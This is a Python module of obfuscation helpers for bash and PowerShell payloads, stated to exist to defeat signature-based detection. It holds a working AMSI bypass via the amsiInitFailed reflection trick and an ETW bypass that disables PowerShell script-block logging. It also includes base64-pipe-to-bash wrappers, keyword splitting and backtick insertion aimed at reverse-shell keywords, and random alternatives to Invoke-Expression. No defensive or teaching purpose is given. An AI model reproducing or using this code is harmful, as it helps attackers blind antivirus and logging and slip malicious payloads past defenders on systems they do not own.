"""
Deep obfuscation helpers for bash and PowerShell payloads.
Applies structural transforms beyond variable renaming to defeat
signature-based detection without breaking functionality.
"""
import base64
import random


# ── Bash ──────────────────────────────────────────────────────────────────────

def bash_hex_encode(path: str) -> str:
    """Convert a shell path like /bin/bash to ANSI-C $'\\xNN...' form."""
    return "$'" + "".join(f"\\x{ord(c):02x}" for c in path) + "'"


def bash_base64_pipe(command: str) -> str:
    """Wrap an entire bash command in an echo|base64 -d|bash envelope."""
    encoded = base64.b64encode(command.encode()).decode()
    return f"echo {encoded}|base64 -d|bash"


def bash_split_keyword(keyword: str) -> tuple[str, str]:
    """
    Split a keyword (e.g. 'bash') into two concatenated shell variable
    assignments. Returns (setup_code, reference) — caller emits setup_code
    first, then uses reference in place of the keyword.

    Example: 'bash' → ('a=ba;b=sh', '$a$b')
    """
    mid = random.randint(1, len(keyword) - 1)
    v1 = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(1, 3)))
    v2 = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(1, 3)))
    setup = f"{v1}={keyword[:mid]};{v2}={keyword[mid:]}"
    ref = f"${v1}${v2}"
    return setup, ref


def bash_octal_encode(path: str) -> str:
    """Convert a shell path to ANSI-C octal form: $'\\NNN...'"""
    return "$'" + "".join(f"\\{ord(c):03o}" for c in path) + "'"


# ── PowerShell ────────────────────────────────────────────────────────────────

def ps_tick_marks(s: str, keywords: list[str] | None = None) -> str:
    """
    Insert PowerShell backtick (`) escape chars into keywords to break signatures.

    Every occurrence of every keyword is independently obfuscated with a different
    interior tick position, so repeated `System` / `Net` / `Sockets` references are
    each broken up uniquely. Backticks inside PowerShell identifiers are no-ops at
    parse time, so the semantics are unchanged.
    """
    if keywords is None:
        keywords = ["System", "Net", "Sockets", "TCPClient", "Stream", "Encoding",
                    "String", "Byte", "Object", "ScriptBlock", "Invoke", "Expression",
                    "Management", "Automation", "Runspace", "Pipeline", "Runtime",
                    "Marshal", "Reflection", "Assembly", "Convert", "Encoding"]
    result_parts: list[str] = []
    i = 0
    while i < len(s):
        matched = False
        for kw in keywords:
            if len(kw) > 3 and s.startswith(kw, i):
                pos = random.randint(1, len(kw) - 2)
                result_parts.append(kw[:pos] + "`" + kw[pos:])
                i += len(kw)
                matched = True
                break
        if not matched:
            result_parts.append(s[i])
            i += 1
    return "".join(result_parts)


def ps_char_array(s: str) -> str:
    """Convert a string to [char[]](n,n,...) -join '' PowerShell form."""
    nums = ",".join(str(ord(c)) for c in s)
    return f"([char[]]({nums}) -join '')"


def ps_concat_split(s: str, min_chunk: int = 2, max_chunk: int = 5) -> str:
    """Split a string into random-sized quoted chunks joined with +."""
    parts = []
    i = 0
    while i < len(s):
        chunk = random.randint(min_chunk, max_chunk)
        parts.append(f"'{s[i:i+chunk]}'")
        i += chunk
    return "+".join(parts)


def ps_amsi_bypass(obfuscate: bool = True) -> str:
    """
    Returns a PowerShell AMSI bypass block.
    When obfuscate=True, splits the signatured strings to avoid static detection.
    Uses the amsiInitFailed reflection approach — effective on unpatched Defender.
    """
    if not obfuscate:
        return (
            "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
            "$b=$a.GetField('amsiInitFailed','NonPublic,Static');"
            "$b.SetValue($null,$true)"
        )

    # Split the signatured class and field names into concatenated chunks
    cls_parts = ps_concat_split("System.Management.Automation.AmsiUtils")
    field_parts = ps_concat_split("amsiInitFailed")
    flag_parts = ps_concat_split("NonPublic,Static")

    va = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(2, 4)))
    vb = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(2, 4)))

    return (
        f"${va}=[Ref].Assembly.GetType({cls_parts});"
        f"${vb}=${va}.GetField({field_parts},{flag_parts});"
        f"${vb}.SetValue($null,$true)"
    )


def ps_etw_bypass(obfuscate: bool = True) -> str:
    """
    Returns a PowerShell ETW (Event Tracing for Windows) bypass.
    Patches the etwProvider handle in PSEtwLogProvider to disable script-block logging.
    """
    provider_parts = ps_concat_split("System.Management.Automation.Tracing.PSEtwLogProvider") if obfuscate else "'System.Management.Automation.Tracing.PSEtwLogProvider'"
    field_parts = ps_concat_split("etwProvider") if obfuscate else "'etwProvider'"
    flags_parts = ps_concat_split("NonPublic,Static") if obfuscate else "'NonPublic,Static'"

    ve = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(2, 4)))
    vf = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(2, 4)))
    vg = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(2, 4)))

    return (
        f"${ve}=[Ref].Assembly.GetType({provider_parts});"
        f"${vf}=${ve}.GetField({field_parts},{flags_parts}).GetValue($null);"
        f"${vg}=${vf}.GetType().GetField('m_regHandle','NonPublic,Instance').GetValue(${vf});"
        f"[Runtime.InteropServices.Marshal]::WriteByte(${vg},2)"
    )


def ps_invoke_expression_alt(code_var: str) -> str:
    """Return a random alternative to iex for invoking a code string stored in $var."""
    choices = [
        f"[ScriptBlock]::Create(${code_var}).Invoke()",
        f"&([ScriptBlock]::Create(${code_var}))",
        f"Invoke-Expression ${code_var}",
        f"${code_var}|iex",
    ]
    return random.choice(choices)
